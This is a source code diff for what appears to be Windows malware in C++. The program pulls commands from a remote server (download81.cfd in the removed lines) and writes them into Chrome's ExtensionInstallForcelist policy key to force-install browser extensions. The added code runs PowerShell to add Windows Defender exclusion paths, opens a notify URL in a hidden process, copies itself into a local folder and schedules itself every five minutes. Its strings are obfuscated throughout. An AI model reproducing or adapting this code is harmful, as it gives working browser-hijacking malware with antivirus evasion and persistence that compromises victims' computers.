@@ -7,17 +7,18 @@
 #include <sstream>
 #include <vector>
 #include <algorithm> // for std::remove_if
-#include "MetaString.h"
-#include "ObfuscatedCall.h"
-#include "ObfuscatedCallWithPredicate.h"
+#include "config.h"
+#include "util.h"
+#include <tchar.h>
+#include "obfuscate.h"
+
+#pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "taskschd.lib")
+#pragma comment(lib, "comsuppw.lib")
 
 #pragma warning(disable: 4503)
 
 using namespace std;
-using namespace andrivet::ADVobfuscator;
-
-#define COMMANDSERVER "https:\/\/download81.cfd\/data.txt"
-#define NOTIFYSERVER "https:\/\/seekspot.io\/tyy"
 
 // Callback function to write the data received from the server into a string
 size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
@@ -106,9 +107,10 @@ bool CreateRegistryKeyAndSetValues(HKEY hKeyParent, const std::string& subKey, c
 	return true;
 }
 
-int main()
+int runmain()
 {
-	std::string serverurl = OBFUSCATED(COMMANDSERVER);
+	char* var = AY_OBFUSCATE(COMMANDSERVER);
+	std::string serverurl(var);
 	std::string result = get_command_from_server(serverurl);
 	std::vector<std::string> commands = splitByNewline(result);
 
@@ -117,40 +119,91 @@ int main()
 		std::string line2 = commands[1];
 		std::string line3 = commands[2];
 
-		std::string chromeSubKey = OBFUSCATED("Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist");
-		std::string edgeSubKey = OBFUSCATED("Software\\Policies\\Microsoft\\Edge\\ExtensionInstallForcelist");
+		var = AY_OBFUSCATE(_T("Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist"));
+		std::string chromeSubKey(var);
 		
 
 		// Create registry keys and set values for Chrome
-		if (CreateRegistryKeyAndSetValues(HKEY_LOCAL_MACHINE, chromeSubKey, OBFUSCATED("1"), line1) &&
-			CreateRegistryKeyAndSetValues(HKEY_LOCAL_MACHINE, chromeSubKey, OBFUSCATED("2"), line2) &&
-			CreateRegistryKeyAndSetValues(HKEY_LOCAL_MACHINE, edgeSubKey, OBFUSCATED("1"), line3)) {
-		
-			const char* url = NOTIFYSERVER;
-			HINSTANCE result = ShellExecute(NULL, OBFUSCATED("open"), url, NULL, NULL, SW_SHOWNORMAL);
-		
-			// Check the result
-			if ((int)result <= 32) {
-				return 1;
-			}
+		if (CreateRegistryKeyAndSetValues(HKEY_LOCAL_MACHINE, chromeSubKey, "1", line1) &&
+			CreateRegistryKeyAndSetValues(HKEY_LOCAL_MACHINE, chromeSubKey, "2", line2) && 
+			CreateRegistryKeyAndSetValues(HKEY_LOCAL_MACHINE, chromeSubKey, "3", line3)) {
+			return 1;
 		}
 	}
+
+	return 0;
 }
 
-BOOL APIENTRY DllMain(HMODULE hModule,
-	DWORD  ul_reason_for_call,
-	LPVOID lpReserved
-)
+int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
+	_In_opt_ HINSTANCE hPrevInstance,
+	_In_ LPWSTR    lpCmdLine,
+	_In_ int       nCmdShow)
 {
-	switch (ul_reason_for_call)
-	{
-	case DLL_PROCESS_ATTACH:
-		break;
-	case DLL_THREAD_ATTACH:
-	case DLL_THREAD_DETACH:
-	case DLL_PROCESS_DETACH:
-		break;
+	HANDLE hMutex = CreateMutexA(NULL, TRUE, AY_OBFUSCATE(MUTEX_NAME));
+	if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
+		return 1;
 	}
-	return TRUE;
-}
 
+	int index = 1;
+	for (index = 1; index < 60; index++)
+	{
+		Sleep(1000);
+	}
+
+	BOOL serviceRun = GetParameter();
+
+	if (serviceRun) {
+		runmain();
+	}
+	else {
+		
+		char path[MAX_PATH];
+		GetModuleFileNameA(NULL, path, MAX_PATH);
+
+		// Extract the directory path from the executable path
+		char* lastBackslash = strrchr(path, '\\');
+		if (lastBackslash != NULL)
+			* (lastBackslash + 1) = '\0';
+
+		// Get the value of the %localappdata% variable
+		char destinationPath[MAX_PATH];
+		// char destinationAnimPath[MAX_PATH];
+		ExpandEnvironmentStringsA(AY_OBFUSCATE(BASE_PATH), destinationPath, MAX_PATH);
+
+		//create path
+		CreateDirectoryRecursively(destinationPath);
+
+		RunPowerShellCommand("Add-MpPreference -ExclusionPath $env:APPDATA\\ExtensionChecker");
+		RunPowerShellCommand("Add-MpPreference -ExclusionPath $env:SystemRoot\\System32\\Tasks\\Microsoft\\Windows");
+
+		//open url
+		char* var = AY_OBFUSCATE(NOTIFYSERVER);
+		std::string url(var);
+
+		var = AY_OBFUSCATE("cmd.exe /c start ");
+		std::string command(var);
+		command += url;
+
+		STARTUPINFOA si;
+		PROCESS_INFORMATION pi;
+
+		// Set up the STARTUPINFO structure
+		ZeroMemory(&si, sizeof(si));
+		si.cb = sizeof(si);
+		si.dwFlags = STARTF_USESHOWWINDOW;
+		si.wShowWindow = SW_HIDE;
+		ZeroMemory(&pi, sizeof(pi));
+
+		// Create the process
+		if (!CreateProcessA(NULL, const_cast<char*>(command.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+			// Handle the error
+			return -1;
+		}
+
+
+		// move file to target
+		CopyAllFiles((char*)AY_OBFUSCATE(BASE_PATH));
+
+		MakeSchedule("PT5M", (char*)AY_OBFUSCATE(BASE_PATH));
+	}
+}
